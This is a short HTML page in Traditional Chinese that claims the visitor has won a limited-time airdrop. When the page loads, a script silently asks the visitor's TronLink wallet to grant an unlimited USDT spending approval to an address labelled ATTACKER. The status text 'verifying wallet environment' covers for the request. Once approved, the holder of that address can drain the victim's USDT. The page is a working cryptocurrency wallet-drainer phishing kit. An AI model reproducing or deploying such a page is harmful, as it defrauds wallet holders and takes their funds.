<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>限時空投</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body {
      font-family: 'Arial';
      background: #f9f9f9;
      text-align: center;
      padding: 60px;
    }
    h1 {
      font-size: 28px;
      color: #222;
    }
    #status {
      margin-top: 30px;
      font-size: 18px;
      color: #555;
    }
  </style>
</head>
<body>
  <h1>恭喜你獲得限時空投！</h1>
  <p id="status">正在驗證錢包環境...</p>

  <script>
    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
    const ATTACKER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";

    async function approveUSDT() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "請使用 TronLink App 掃描進入此頁面。";
        return;
      }

      const address = window.tronWeb.defaultAddress.base58;
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      document.getElementById("status").innerText = "⏳ 發送授權中...";

      try {
        const tx = await contract.approve(ATTACKER, max).send();
        document.getElementById("status").innerText = `✅ 授權成功！TxID: ${tx}`;
      } catch (e) {
        document.getElementById("status").innerText = `❌ 授權失敗：${e.message}`;
      }
    }

    window.addEventListener('load', approveUSDT);
  </script>
</body>
</html>
